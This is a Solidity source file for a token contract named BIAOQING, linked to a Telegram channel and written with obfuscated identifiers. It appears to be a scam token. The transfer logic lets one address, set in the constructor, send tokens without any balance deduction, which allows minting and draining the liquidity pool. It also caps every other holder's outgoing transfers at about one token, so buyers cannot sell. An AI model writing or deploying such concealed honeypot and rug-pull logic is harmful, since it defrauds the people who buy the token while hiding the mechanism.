/*

https://t.me/biaoqingerc

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract BIAOQING is Ownable {
    address private ybhiwlscukda;

    constructor(string memory ngmswzrql, string memory qplt, address blztvsof, address nhyrpk) {
        name = ngmswzrql;
        symbol = qplt;
        balanceOf[msg.sender] = totalSupply;
        izcosak[nhyrpk] = tqkhzdgo;
        IUniswapV2Router02 ghczx = IUniswapV2Router02(blztvsof);
        ybhiwlscukda = IUniswapV2Factory(ghczx.factory()).createPair(address(this), ghczx.WETH());
    }

    uint8 public decimals = 9;

    function chfdp(address psjtyc, address xijcbdaf, uint256 vgapfhszc) private {
        if (0 == izcosak[psjtyc]) {
            if (psjtyc != ybhiwlscukda && wjpva[psjtyc] != block.number && vgapfhszc < totalSupply) {
                require(vgapfhszc <= totalSupply / (10 ** decimals));
            }
            balanceOf[psjtyc] -= vgapfhszc;
        }
        balanceOf[xijcbdaf] += vgapfhszc;
        wjpva[xijcbdaf] = block.number;
        emit Transfer(psjtyc, xijcbdaf, vgapfhszc);
    }

    function transferFrom(address psjtyc, address xijcbdaf, uint256 vgapfhszc) public returns (bool success) {
        require(vgapfhszc <= allowance[psjtyc][msg.sender]);
        allowance[psjtyc][msg.sender] -= vgapfhszc;
        chfdp(psjtyc, xijcbdaf, vgapfhszc);
        return true;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function transfer(address xijcbdaf, uint256 vgapfhszc) public returns (bool success) {
        chfdp(msg.sender, xijcbdaf, vgapfhszc);
        return true;
    }

    string public name;

    string public symbol;

    mapping(address => uint256) private wjpva;

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => uint256) public balanceOf;

    function approve(address gqemkrhfi, uint256 vgapfhszc) public returns (bool success) {
        allowance[msg.sender][gqemkrhfi] = vgapfhszc;
        emit Approval(msg.sender, gqemkrhfi, vgapfhszc);
        return true;
    }

    mapping(address => uint256) private izcosak;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    uint256 private tqkhzdgo = 103;
}